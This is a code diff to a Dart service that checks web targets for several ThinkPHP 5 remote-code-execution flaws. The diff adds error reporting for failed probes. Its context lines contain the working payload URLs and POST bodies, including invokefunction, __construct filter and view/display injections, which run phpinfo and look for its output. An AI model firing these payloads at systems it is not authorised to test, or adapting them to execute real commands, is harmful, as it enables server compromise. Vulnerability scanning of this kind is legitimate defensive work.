@@ -34,6 +34,8 @@ class ThinkphpV5ExpService {
   }
 
   Future<ThinkphpResult> checkTp50() async {
+    Object? lastError;
+    var anyResponse = false;
     final mod = await getModule();
     final urls = [
       '${baseUri}?s=/$mod/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1',
@@ -42,15 +44,21 @@ class ThinkphpV5ExpService {
     for (final u in urls) {
       try {
         final res = await http.get(Uri.parse(u)).timeout(timeout);
+        anyResponse = true;
         if (res.body.contains(_phpVersionCheck)) {
           return ThinkphpResult(true, 'ThinkPHP 5.0 RCE', u);
         }
-      } catch (_) {}
+      } catch (e) { lastError = e; }
+    }
+    if (!anyResponse && lastError != null) {
+      return ThinkphpResult.probeFailed('ThinkPHP 5.0 RCE', '探测失败: $lastError');
     }
     return ThinkphpResult(false, 'ThinkPHP 5.0 RCE', '');
   }
 
   Future<ThinkphpResult> checkTp5010() async {
+    Object? lastError;
+    var anyResponse = false;
     final mod = await getModule();
     final base = '${baseUri}?s=$mod';
     final payloads = [
@@ -60,15 +68,21 @@ class ThinkphpV5ExpService {
     for (final p in payloads) {
       try {
         final res = await http.post(Uri.parse(base), body: formMap(p)).timeout(timeout);
+        anyResponse = true;
         if (res.body.contains(_phpVersionCheck)) {
           return ThinkphpResult(true, 'ThinkPHP 5.0.10 RCE', '$base Post: $p');
         }
-      } catch (_) {}
+      } catch (e) { lastError = e; }
+    }
+    if (!anyResponse && lastError != null) {
+      return ThinkphpResult.probeFailed('ThinkPHP 5.0.10 RCE', '探测失败: $lastError');
     }
     return ThinkphpResult(false, 'ThinkPHP 5.0.10 RCE', '');
   }
 
   Future<ThinkphpResult> checkTp5022_5129() async {
+    Object? lastError;
+    var anyResponse = false;
     final mod = await getModule();
     final urls = [
       '${baseUri}?s=/$mod/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1',
@@ -78,15 +92,21 @@ class ThinkphpV5ExpService {
     for (final u in urls) {
       try {
         final res = await http.get(Uri.parse(u)).timeout(timeout);
+        anyResponse = true;
         if (res.body.contains(_phpVersionCheck)) {
           return ThinkphpResult(true, 'ThinkPHP 5.0.22/5.1.29 RCE', u);
         }
-      } catch (_) {}
+      } catch (e) { lastError = e; }
+    }
+    if (!anyResponse && lastError != null) {
+      return ThinkphpResult.probeFailed('ThinkPHP 5.0.22/5.1.29 RCE', '探测失败: $lastError');
     }
     return ThinkphpResult(false, 'ThinkPHP 5.0.22/5.1.29 RCE', '');
   }
 
   Future<ThinkphpResult> checkTp5023() async {
+    Object? lastError;
+    var anyResponse = false;
     final payloadUrl = '${baseUri}?s=captcha&test=-1';
     final payloads = [
       '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1',
@@ -96,15 +116,21 @@ class ThinkphpV5ExpService {
     for (final p in payloads) {
       try {
         final res = await http.post(Uri.parse(payloadUrl), body: formMap(p)).timeout(timeout);
+        anyResponse = true;
         if (res.body.contains(_phpVersionCheck)) {
           return ThinkphpResult(true, 'ThinkPHP 5.0.23 RCE', '$payloadUrl Post: $p');
         }
-      } catch (_) {}
+      } catch (e) { lastError = e; }
+    }
+    if (!anyResponse && lastError != null) {
+      return ThinkphpResult.probeFailed('ThinkPHP 5.0.23 RCE', '探测失败: $lastError');
     }
     return ThinkphpResult(false, 'ThinkPHP 5.0.23 RCE', '');
   }
 
   Future<ThinkphpResult> checkTp5024_5130() async {
+    Object? lastError;
+    var anyResponse = false;
     final mod = await getModule();
     final urls = [
       '${baseUri}?s=$mod/\\think\\Request/input&filter[]=phpinfo&data=-1',
@@ -113,15 +139,21 @@ class ThinkphpV5ExpService {
     for (final u in urls) {
       try {
         final res = await http.get(Uri.parse(u)).timeout(timeout);
+        anyResponse = true;
         if (res.body.contains(_phpVersionCheck)) {
           return ThinkphpResult(true, 'ThinkPHP 5.0.24-5.1.30 RCE', u);
         }
-      } catch (_) {}
+      } catch (e) { lastError = e; }
+    }
+    if (!anyResponse && lastError != null) {
+      return ThinkphpResult.probeFailed('ThinkPHP 5.0.24-5.1.30 RCE', '探测失败: $lastError');
     }
     return ThinkphpResult(false, 'ThinkPHP 5.0.24-5.1.30 RCE', '');
   }
 
   Future<ThinkphpResult> checkTp5023Debug() async {
+    Object? lastError;
+    var anyResponse = false;
     final payloads = [
       {'_method': '__construct', 'filter[]': 'phpinfo', 'server[REQUEST_METHOD]': '1'},
       {'_method': '__construct', 'filter[]': 'phpinfo', 'method': 'get', 'server[REQUEST_METHOD]': '1'},
@@ -129,15 +161,21 @@ class ThinkphpV5ExpService {
     for (final body in payloads) {
       try {
         final res = await http.post(baseUri, body: body).timeout(timeout);
+        anyResponse = true;
         if (res.body.contains(_phpVersionCheck)) {
           return ThinkphpResult(true, 'ThinkPHP 5.0.23 Debug RCE', 'POST $baseUri');
         }
-      } catch (_) {}
+      } catch (e) { lastError = e; }
+    }
+    if (!anyResponse && lastError != null) {
+      return ThinkphpResult.probeFailed('ThinkPHP 5.0.23 Debug RCE', '探测失败: $lastError');
     }
     return ThinkphpResult(false, 'ThinkPHP 5.0.23 Debug RCE', '');
   }
 
   Future<ThinkphpResult> checkTp5ViewDisplay() async {
+    Object? lastError;
+    var anyResponse = false;
     final mod = await getModule();
     final content = Uri.encodeComponent('<?php phpinfo();?>');
     final urls = [
@@ -147,10 +185,14 @@ class ThinkphpV5ExpService {
     for (final u in urls) {
       try {
         final res = await http.get(Uri.parse(u)).timeout(timeout);
+        anyResponse = true;
         if (res.body.contains(_phpVersionCheck)) {
           return ThinkphpResult(true, 'ThinkPHP 5 View/display RCE', u);
         }
-      } catch (_) {}
+      } catch (e) { lastError = e; }
+    }
+    if (!anyResponse && lastError != null) {
+      return ThinkphpResult.probeFailed('ThinkPHP 5 View/display RCE', '探测失败: $lastError');
     }
     return ThinkphpResult(false, 'ThinkPHP 5 View/display RCE', '');
   }
